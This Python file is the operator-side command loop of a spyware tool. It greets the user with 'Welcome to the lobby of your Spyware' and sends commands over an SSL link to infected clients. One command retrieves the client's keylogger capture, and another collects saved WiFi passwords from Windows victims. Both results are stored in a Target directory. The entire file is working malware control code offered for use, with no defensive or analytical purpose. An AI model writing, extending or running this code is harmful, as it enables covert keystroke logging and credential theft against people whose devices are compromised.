from Tools.Color import colors
from datetime import datetime
from Tools.Loop.terminal import terminal
from Tools.File_Tools.file import receive_file
import os

def loop(port, host, client_ssl, ip_client):
    """Boucle principale de traitement des commandes."""
    while True:
        print(f"{colors.orange}Welcome to the lobby of your Spyware")
        target_dir = "Target"
        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        print(f"""♦ your server is listening on the port {port}
                    \n✅ on Server: {host}
                    \n✅ Connected to Client IP: {str(ip_client)}
                    \n• 'k'/'kill' to stop the spyware and save the result of the client
                    \n• 'wifi' to save all the past password ESSID save on the client device only on windows device""")
        cli = terminal()
        if cli == "kill" or cli == "k":
            print(f"Connection stopped with the client {ip_client}")
            client_ssl.send("STOP".encode())
            filename = os.path.join(target_dir, f"{ip_client}-{current_time}-keyboard.txt")
            receive_file(client_ssl, filename)
            print(f"key_logger result file received successfully. Client is OFF")
            client_ssl.close()
            exit(1)
        if cli == "wifi":
            client_ssl.send("WIFI".encode())
            filename = os.path.join(target_dir, f"{ip_client}-{current_time}-wifi_result.txt")
            receive_file(client_ssl,filename)
            print(f"{colors.green}Wifi_result Successfuly Save")
            terminal()
        else:
            print(f"{colors.red}❌ unknown command")